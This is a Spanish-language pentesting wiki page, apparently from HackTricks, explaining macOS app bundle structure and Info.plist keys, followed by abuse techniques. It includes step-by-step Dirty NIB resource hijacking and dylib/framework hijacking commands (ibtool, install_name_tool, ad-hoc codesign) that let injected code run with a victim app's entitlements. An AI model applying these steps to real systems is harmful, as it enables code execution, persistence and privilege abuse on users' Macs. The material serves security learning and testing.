# Bundles de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Información básica

Los bundles en macOS sirven como contenedores para diversos recursos, incluidas aplicaciones, bibliotecas y otros archivos necesarios, haciendo que aparezcan como objetos individuales en Finder, como los conocidos archivos `*.app`. El bundle más común es el bundle `.app`, aunque también son habituales otros tipos como `.framework`, `.systemextension` y `.kext`.

### Componentes esenciales de un bundle

Dentro de un bundle, especialmente en el directorio `<application>.app/Contents/`, se almacenan diversos recursos importantes:

- **\_CodeSignature**: Este directorio almacena los detalles de code signing necesarios para verificar la integridad de la aplicación. Puedes inspeccionar la información de code signing mediante comandos como:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Contiene el binario ejecutable de la aplicación que se ejecuta tras la interacción del usuario.
- **Resources**: Repositorio de los componentes de la interfaz de usuario de la aplicación, incluidas imágenes, documentos y descripciones de la interfaz (archivos nib/xib).
- **Info.plist**: Actúa como el archivo de configuración principal de la aplicación, fundamental para que el sistema la reconozca e interactúe con ella correctamente.

#### Claves importantes en Info.plist

El archivo `Info.plist` es fundamental para la configuración de la aplicación y contiene claves como:

- **CFBundleExecutable**: Especifica el nombre del archivo ejecutable principal ubicado en el directorio `Contents/MacOS`.
- **CFBundleIdentifier**: Proporciona un identificador global para la aplicación, utilizado ampliamente por macOS para la gestión de aplicaciones.
- **LSMinimumSystemVersion**: Indica la versión mínima de macOS necesaria para ejecutar la aplicación.

### Exploración de Bundles

Para explorar el contenido de un bundle, como `Safari.app`, se puede utilizar el siguiente comando: `bash ls -lR /Applications/Safari.app/Contents`

Esta exploración muestra directorios como `_CodeSignature`, `MacOS` y `Resources`, además de archivos como `Info.plist`, cada uno con una función específica, desde proteger la aplicación hasta definir su interfaz de usuario y sus parámetros operativos.

#### Directorios adicionales de los Bundles

Además de los directorios comunes, los bundles también pueden incluir:

- **Frameworks**: Contiene los frameworks incluidos que utiliza la aplicación. Los frameworks son similares a los dylibs, pero con recursos adicionales.
- **PlugIns**: Directorio para plug-ins y extensiones que amplían las capacidades de la aplicación.
- **XPCServices**: Contiene los servicios XPC utilizados por la aplicación para la comunicación out-of-process.

Esta estructura garantiza que todos los componentes necesarios estén encapsulados dentro del bundle, facilitando un entorno de aplicación modular y seguro.

Para obtener información más detallada sobre las claves de `Info.plist` y sus significados, la documentación para desarrolladores de Apple proporciona recursos extensos: [Referencia de claves de Info.plist de Apple](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Notas de seguridad y vectores de abuso

- **Gatekeeper / App Translocation**: Cuando se ejecuta por primera vez un bundle en cuarentena, macOS realiza una verificación profunda de la firma y puede ejecutarlo desde una ruta translocated aleatoria. Una vez aceptado, los lanzamientos posteriores solo realizan comprobaciones superficiales; históricamente, los archivos de recursos en `Resources/`, `PlugIns/`, los nibs, etc., no se verificaban. Desde macOS 13 Ventura se aplica una comprobación profunda en la primera ejecución y el nuevo permiso TCC de *App Management* restringe que los procesos de terceros modifiquen otros bundles sin el consentimiento del usuario, pero los sistemas antiguos siguen siendo vulnerables.
- **Colisiones de Bundle Identifier**: Múltiples targets integrados (PlugIns, herramientas auxiliares) que reutilicen el mismo `CFBundleIdentifier` pueden romper la validación de la firma y, ocasionalmente, permitir el secuestro/confusión de esquemas URL. Enumera siempre los sub-bundles y verifica que los identificadores sean únicos.

## Resource Hijacking (Dirty NIB / NIB Injection)

Antes de Ventura, intercambiar recursos de interfaz de usuario en una aplicación firmada podía eludir la firma de código superficial y permitir la ejecución de código con los entitlements de la aplicación. Las investigaciones actuales (2024) muestran que esto sigue funcionando en sistemas anteriores a Ventura y en builds sin cuarentena:<sup>[1][2]</sup>

1. Copia la aplicación objetivo a una ubicación con permisos de escritura (por ejemplo, `/tmp/Victim.app`).
2. Sustituye `Contents/Resources/MainMenu.nib` (o cualquier nib declarado en `NSMainNibFile`) por uno malicioso que instancie `NSAppleScript`, `NSTask`, etc.
3. Inicia la aplicación. El nib malicioso se ejecuta con el bundle ID y los entitlements de la víctima (concesiones TCC, acceso al micrófono/cámara, etc.).
4. Ventura+ mitiga esto verificando profundamente el bundle en el primer lanzamiento y requiriendo el permiso de *App Management* para modificaciones posteriores, por lo que la persistencia resulta más difícil, pero los ataques durante el lanzamiento inicial en versiones antiguas de macOS siguen siendo aplicables.<sup>[1]</sup>

Ejemplo mínimo de payload de nib malicioso (compila el xib a nib con `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking dentro de Bundles

Debido a que las búsquedas de `@rpath` dan prioridad a los Frameworks/PlugIns incluidos en el Bundle, colocar una library maliciosa dentro de `Contents/Frameworks/` o `Contents/PlugIns/` puede redirigir el orden de carga cuando el binario principal está firmado sin library validation o con un orden débil de `LC_RPATH`.

Pasos típicos al abusar de un Bundle unsigned/ad-hoc:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notas:
- El hardened runtime con `com.apple.security.cs.disable-library-validation` ausente bloquea dylibs de terceros; comprueba primero los entitlements.
- Los servicios XPC en `Contents/XPCServices/` suelen cargar frameworks hermanos; aplica parches a sus binarios de forma similar para obtener persistencia o rutas de privilege escalation.

## Guía rápida de inspección
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Referencias

- [1] [Bringing process injection into view(s): explotación de apps de macOS mediante archivos nib (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB y write-up sobre la manipulación de recursos de bundle (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
